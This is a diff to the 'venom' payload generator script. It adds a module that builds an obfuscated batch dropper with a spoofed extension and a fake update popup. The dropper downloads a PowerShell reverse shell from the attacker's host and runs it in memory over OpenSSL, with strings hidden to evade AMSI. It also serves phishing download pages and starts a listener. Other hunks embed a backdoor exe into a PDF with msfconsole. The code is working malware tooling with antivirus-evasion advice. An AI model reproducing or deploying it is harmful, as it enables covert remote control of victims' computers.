@@ -5012,9 +5012,8 @@ echo "[☠] Building template -> template.c!"
 sleep 2
 # build template file in C language
 # reproduction of venom option 6 payload
-echo "// C template | Author: r00t-3xp10it " > $IPATH/output/template.c
-echo "// execute shellcode powershell base 64 encoded into memory (ram) " >> $IPATH/output/template.c
-echo "// ---" >> $IPATH/output/template.c
+echo "// C template | Author: r00t-3xp10it" > $IPATH/output/template.c
+echo "// execute shellcode powershell base 64 encoded into memory (ram)" >> $IPATH/output/template.c
 echo "" >> $IPATH/output/template.c
 echo "#include <stdio.h> " >> $IPATH/output/template.c
 echo "#include <stdlib.h> " >> $IPATH/output/template.c
@@ -5040,7 +5039,7 @@ strip --strip-debug $IPATH/output/backdoor.exe
 
 # if you wish to inject your build in another pdf file then change: ( INFILENAME ) switch by the full path to your pdf file
 # using msfconsole to embedded the backdoor.exe into one pdf file (remmenber to exit msfconsole: exit -y)
-xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $IPATH/output/backdoor.exe; set FILENAME $N4m.pdf; set INFILENAME $Myd0; exploit; exit -y'" > /dev/null 2>&1
+xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe;set EXE::Custom $IPATH/output/backdoor.exe;set FILENAME $N4m.pdf;set INFILENAME $Myd0;exploit;exit -y'" > /dev/null 2>&1
 
 
 # move files from metasploit to local directory
@@ -12300,7 +12299,7 @@ cat << !
     DESCRIPTION        : Reverse Powershell Shell (hex obfuscation)
     TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     LOLBin             : Powershell (DownloadFile)
-    DROPPER EXTENSION  : .crdownload.BAT (MITRE T1036)
+    DROPPER EXTENSION  : .CRDOWNLOAD.BAT (MITRE T1036)
     AGENT EXTENSION    : PS1
     AGENT PERSISTENCE  : AVAILABLE
 
@@ -12331,6 +12330,15 @@ cat << !
     AGENT EXTENSION    : PY
     AGENT PERSISTENCE  : NOT AVAILABLE
 
+    AGENT Nº7
+    ─────────
+    DESCRIPTION        : Reverse OpenSSL Powershell Shell
+    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    LOLBin             : WinHttpRequest (FileLess)
+    DROPPER EXTENSION  : BAT
+    AGENT EXTENSION    : PS1
+    AGENT PERSISTENCE  : NOT AVAILABLE
+
     ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
     ║   E    - Exit venom Framework                               ║
@@ -12348,12 +12356,14 @@ case $choice in
 4) sh_evasion4 ;;
 5) sh_evasion5 ;;
 6) vbsevasion="ON";sh_shellcode27 ;;
+7) sh_evasion7 ;;
 "help 1") easter1 ;;
 "help 2") easter2 ;;
 "help 3") easter3 ;;
 "help 4") easter4 ;;
 "help 5") easter5 ;;
 "help 6") easter6 ;;
+"help 7") easter7 ;;
 m|M) sh_menu ;;
 e|E) sh_exit ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_ninja ;;
@@ -12465,6 +12475,22 @@ read odf
 clear
 sh_ninja
 }
+easter7 () {
+cat << !
+
+    AGENT Nº   : 7
+    OBFUSCATION: $obfstat <= (settings file)
+    DESCRIPTION: Reverse TCP Powershell Shell (OpenSSL - FileLess)
+    OBFUSCATION: If activated, dropper.bat will be obfuscated to evade
+                 Anti-Virus detection and have is extension spoofed to
+                 Dropper.crdownload.bat [2º extension hidden under M$]
+
+!
+echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
+read odf
+clear
+sh_ninja
+}
 
 
 
@@ -12514,7 +12540,7 @@ cat << !
     LOLBin   : WinHttpRequest
     DROPPER  : $IPATH/output/$Drop.$ext
     AGENT    : $IPATH/output/$NaM.ps1
-    UPLOADTO : Fileless ($tech)
+    UPLOADTO : FileLess ($tech)
     SILENT EXECUTION : $easter_egg
 !
 echo "---"
@@ -12617,6 +12643,7 @@ if [ "$phish" = "Mega-Upload (default)" ]; then
 else
    echo "${BlueF}- ATTACK VECTOR: http://$lhost/Download.html"
 fi
+   echo "${BlueF}- NETCAT SYSINFO: systeminfo|findstr \"Host OS Type\""
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
 read odf
@@ -12837,10 +12864,10 @@ echo "${BlueF}---"
 echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
 if [ "$phish" = "Mega-Upload (default)" ]; then
    echo "${BlueF}- ATTACK VECTOR : http://$lhost/MegaUpload.html"
-   echo "${BlueF}- NETCAT SYSINFO: systeminfo|findstr /C \"Host OS Input Manufacturer Type\""
+   echo "${BlueF}- NETCAT SYSINFO: systeminfo|findstr \"Host OS Type\""
 else
    echo "${BlueF}- ATTACK VECTOR: http://$lhost/Download.html"
-   echo "${BlueF}- NETCAT SYSINFO: systeminfo|findstr /C \"Host OS Input Manufacturer Type\""
+   echo "${BlueF}- NETCAT SYSINFO: systeminfo|findstr \"Host OS Type\""
 fi
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
@@ -13069,10 +13096,10 @@ echo "${BlueF}---"
 echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
 if [ "$phish" = "Mega-Upload (default)" ]; then
    echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
-   echo "${BlueF}- NETCAT SYSINFO: systeminfo|findstr /C \"Host OS Input Manufacturer Type\""
+   echo "${BlueF}- NETCAT SYSINFO: systeminfo|findstr \"Host OS Type\""
 else
    echo "${BlueF}- ATTACK VECTOR: http://$lhost/Download.html"
-   echo "${BlueF}- NETCAT SYSINFO: systeminfo|findstr /C \"Host OS Input Manufacturer Type\""
+   echo "${BlueF}- NETCAT SYSINFO: systeminfo|findstr \"Host OS Type\""
 fi
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
@@ -13538,7 +13565,7 @@ echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";slee
 echo "${BlueF}---"
 echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
 echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
-echo "${BlueF}- SYSINFO: systeminfo|findstr /C \"Host OS Manufacturer Type\""
+echo "${BlueF}- NETCAT SYSINFO: systeminfo|findstr \"Host OS Type\""
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[${YellowF}i${BlueF}]${white} Press any key to start a handler."
 read stupidpause
@@ -13571,6 +13598,195 @@ if [ "$multiArch" = "TRUE" ]; then
    sudo WINEARCH=win64 WINEPREFIX=$rootwine.wine winecfg
    arch="wine64" # Define 'venom' $arch variable again, to be able use other modules. 
 fi
+
+sh_menu
+}
+
+
+
+# -------------------------------------------------
+# Reverse TCP Powershell Shell (openSSL - FileLess)
+# -------------------------------------------------
+sh_evasion7 () {
+Colors;
+
+
+## Make sure all module dependencies are satisfied.
+# OpenSSL (to build Server/Client SSL certificates)
+audit=$(which openssl) > /dev/null 2>&1
+if [ "$?" -ne "0" ]; then
+   echo "${RedF}[ERROR] none openssl installation found.${white}";sleep 2
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, Installing openssl."
+   echo "" && sudo apt-get update && apt-get install -y openssl && echo ""
+   sleep 2 && clear
+fi
+
+
+## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
+echo "---"
+echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "- Please Dont test samples on Virus Total or on similar"${Reset};
+echo "- online scanners, because that will shorten the payload life."${Reset};
+echo "- And in testings also remmenber to stop the windows defender"${Reset};
+echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
+echo "---"
+sleep 2
+
+
+## Store User Inputs (bash variable declarations)..
+easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 443" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-playGoogle\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com\nWarning: CN must be a valid Domain Name." --entry --width 300) > /dev/null 2>&1
+
+## Setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
+if [ -z "$Drop" ]; then Drop="Update-playGoogle";fi
+if [ "$easter_egg" = "OFF" ]; then Ext="bat";else Ext="crdownload.bat";fi
+
+
+## Display final settings to user.
+echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 1
+echo ${BlueF}"---"
+cat << !
+    LPORT    : $lport
+    LHOST    : $lhost
+    LOLBin   : WinHttpRequest
+    CNDOMAIN : $CN
+    AGENT    : $IPATH/output/Client.ps1
+    DROPPER  : $IPATH/output/$Drop.$Ext
+    UPLOADTO : FileLess (agent does not touch disk)
+!
+echo "---"
+
+
+cd $IPATH/output
+## BUILD DROPPER (to download/execute our agent.ps1).
+# $proxy=new-object -com WinHttp.WinHttpRequest.5.1;$proxy.open('GET','http://$lhost/Client.ps1',$false);$proxy.send();iex $proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- FILELESS DELIVERY METHOD (dropper)
+echo "${BlueF}[☠]${white} Building Batch script dropper ..${white}";sleep 2
+## Extract Dropper FullName
+FullName=$(echo "$Drop.$Ext"|cut -d '.' -f1|cut -d '-' -f2)
+if [ "$easter_egg" = "ON" ]; then
+   echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" > $IPATH/output/$Drop.$Ext
+   echo ":: Framework: Venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.$Ext
+   echo "@echo off&%@i%&title pl%@#%ay.go%@i%og%_$%le.co%_[-1]%m - Up%@$%dat%@Q%ing S%@%of%@i%twa%@$%re %_$%Rep%@%osi%@%tor%@%ies." >> $IPATH/output/$Drop.$Ext
+   echo "@i%'$%f n%i@%ot DEF%_@$%INE%@h%D IS_MIN%@$%IMI%,;f%ZE%i?%D se%@$%t IS_MIN%_#t%IMIZ%@=i%ED=1 &%@$%& ,s%i0%tA%@%Rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@_%& eX%@$%I%_i_%t" >> $IPATH/output/$Drop.$Ext
+   echo "@po%@i%w\"e\"^r%@i%s^he%@$%ll (nE%@i%W-Obj%@%eCt -Com^O%@$%bjEc%@_%t Wsc%d0b%r\"i\"pt.She%@$%l^l).Po%#i%p\"u\"^p(\"\"\"$FullName so%@%ft%@%wa%@%re up%@%da%@%ted..\"\"\",4,\"\"\"$FullName - 3.10.5-dev Wi%@$%n%@%do%@i%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $IPATH/output/$Drop.$Ext
+   echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll -w 1 \$My%@$%C\"a\"t=nE%@i%W-Obj%@%eCt -Co%@i%m Win\"H\"tt%@$%p.Wi^nH\"t\"tpReq%@i_%ue\"s\"t.5.1;\$MyC%@$%at.op%@f%en('G%@i%ET','ht%@D%t%[-1]%p://$lhost/Client.ps%@[0]%1',\$fal%LeD%se);\$My\"C\"at.se%@$%nd();iex \$My%@1b%Cat.r\"e\"s%@0$%pons%@?%e\"T\"e%@_i%xt;" >> $IPATH/output/$Drop.$Ext
+   echo "=Exit" >> $IPATH/output/$Drop.$Ext
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Obfuscated Batch Dropper written to output.";sleep 1
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Spoofing Batch Dropper Extension ([${GreenF}OK${white}])${white}";sleep 2
+else
+   echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" > $IPATH/output/$Drop.$Ext
+   echo ":: Framework: Venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.$Ext
+   echo ":: Function: This template its used to download the Client.ps1 from attacker" >> $IPATH/output/$Drop.$Ext
+   echo ":: machine (LAN) and execute it on target RAM (FileLess - Agent does not touch disk)" >> $IPATH/output/$Drop.$Ext
+   echo "@echo off&&title play.google.com - Updating Software Repositories." >> $IPATH/output/$Drop.$Ext
+   echo "if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start \"\" /min \"%~dpnx0\" %* && exit" >> $IPATH/output/$Drop.$Ext
+   echo "powershell (NeW-Object -ComObject Wscript.Shell).Popup(\"\"\"$FullName software updated..\"\"\",4,\"\"\"$FullName - 3.10.5-dev Windows Installer\"\"\",0+64)" >> $IPATH/output/$Drop.$Ext
+   echo "powershell -w 1 \$MyCat=New-Object -Com WinHttp.WinHttpRequest.5.1;\$MyCat.open('GET','http://$lhost/Client.ps1',\$false);\$MyCat.send();iex \$MyCat.responseText;" >> $IPATH/output/$Drop.$Ext
+   echo "Exit" >> $IPATH/output/$Drop.$Ext
+fi
+
+
+cd $IPATH/output
+## Build Reverse TCP Powershell Shell (OpenSSL).
+echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
+echo "<#" > $IPATH/output/Client.ps1
+echo "Obfuscated Reverse OpenSSL Shell" >> $IPATH/output/Client.ps1
+echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/Client.ps1
+echo "#>" >> $IPATH/output/Client.ps1
+echo "" >> $IPATH/output/Client.ps1
+echo "\$Buffer = \"tneilCpcT.stekcoS.teN\";\$Cache = \$Buffer.ToCharArray();[Array]::Reverse(\$Cache);" >> $IPATH/output/Client.ps1
+echo "\$NewObjectCommand = (\$Cache -Join '');\$assembly = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$assembly.ToCharArray();" >> $IPATH/output/Client.ps1
+echo "[Array]::Reverse(\$CharArray);\$PSArgException = (\$CharArray -Join '');" >> $IPATH/output/Client.ps1
+echo "" >> $IPATH/output/Client.ps1
+echo "\$socket = New-Object \$NewObjectCommand('$lhost', $lport)" >> $IPATH/output/Client.ps1
+echo "\$stream = \$socket.GetStream()" >> $IPATH/output/Client.ps1
+echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/Client.ps1
+echo "\$sslStream.AuthenticateAsClient('$CN', \$null, \"Tls12\", \$false)" >> $IPATH/output/Client.ps1
+echo "        \$writer = new-object System.IO.StreamWriter(\$sslStream)" >> $IPATH/output/Client.ps1
+echo "        \$writer.Write((pwd).Path + '> ')" >> $IPATH/output/Client.ps1
+echo "        \$writer.flush()" >> $IPATH/output/Client.ps1
+echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/Client.ps1
+echo "" >> $IPATH/output/Client.ps1
+echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/Client.ps1
+echo "   \$data = (New-Object -TypeName \$PSArgException).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
+echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/Client.ps1
+echo "   \$sendback2 = \$sendback + (pwd).Path + '> ';" >> $IPATH/output/Client.ps1
+echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);" >> $IPATH/output/Client.ps1
+echo "   \$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()" >> $IPATH/output/Client.ps1
+echo "}" >> $IPATH/output/Client.ps1
+
+
+cd $IPATH/output
+## Generate SSL certificates (openssl)
+# Delete old certs to prevent future errors.
+rm $IPATH/output/cert.pem > /dev/nul 2>&1
+rm $IPATH/output/key.pem > /dev/nul 2>&1
+echo "${BlueF}[☠]${white} Building SSL certificates (openssl)"${Reset};sleep 2
+xterm -T " Building SSL certificates " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj \"/C=PT/ST=Estremadura/L=Lisbon/O=Global Security/OU=IT Department/CN=$CN\""
+echo "${BlueF}[${YellowF}i${BlueF}]${white} venom/output/key.pem + cert.pem ([${GreenF}OK${white}])";sleep 2
+cd $IPATH
+
+
+## Building the Download Webpage Sellected.
+echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2)"${Reset};sleep 2
+phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" TRUE "Mega-Upload (default)" FALSE "Cumulative Security Update" --width 350 --height 200) > /dev/null 2>&1
+if [ "$phish" = "Mega-Upload (default)" ]; then
+    cd $IPATH/templates/phishing
+   sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > MegaUpload.html
+   mv MegaUpload.html $ApAcHe/MegaUpload.html > /dev/nul 2>&1
+else
+   cd $IPATH/templates/phishing/firefox
+   sed "s|NaM3|http://$lhost/$Drop.zip|g" FakeUpdate.html > Download.html
+   mv Download.html $ApAcHe/Download.html > /dev/nul 2>&1
+   cp -r FakeUpdate_files $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
+fi
+
+
+cd $IPATH/output
+## Copy ALL files to apache2 webroot 
+zip $Drop.zip $Drop.$Ext > /dev/nul 2>&1
+echo "${BlueF}[☠]${white} Porting ALL required files to apache2"${Reset};sleep 2
+cp $IPATH/output/Client.ps1 $ApAcHe/Client.ps1 > /dev/nul 2>&1
+cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
+cd $IPATH
+
+
+cd $IPATH/output
+## Print attack vector on terminal
+echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver";sleep 2
+echo "${BlueF}---"
+echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
+if [ "$phish" = "Mega-Upload (default)" ]; then
+   echo "${BlueF}- ATTACK VECTOR: http://$lhost/MegaUpload.html"
+else
+   echo "${BlueF}- ATTACK VECTOR: http://$lhost/Download.html"
+fi
+echo "${BlueF}- OPENSSL SYSINFO: systeminfo|findstr \"Host OS Type\""
+echo "${BlueF}---"${Reset};
+echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
+read odf
+rm $IPATH/output/Client.ps1 > /dev/nul 2>&1
+## START NETCAT HANDLER ON SELLECTED PORT NUMBER
+xterm -T " OPENSSL LISTENER - $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
+cd $IPATH
+sleep 2
+
+
+## Clean old files.
+echo "${BlueF}[☠]${white} Please Wait, cleaning old files ..${white}";sleep 2
+rm $ApAcHe/Client.ps1 > /dev/nul 2>&1
+rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
+rm $ApAcHe/Download.html > /dev/nul 2>&1
+rm $IPATH/output/Client.ps1 > /dev/nul 2>&1
+rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
+rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
+rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 
 sh_menu
 }
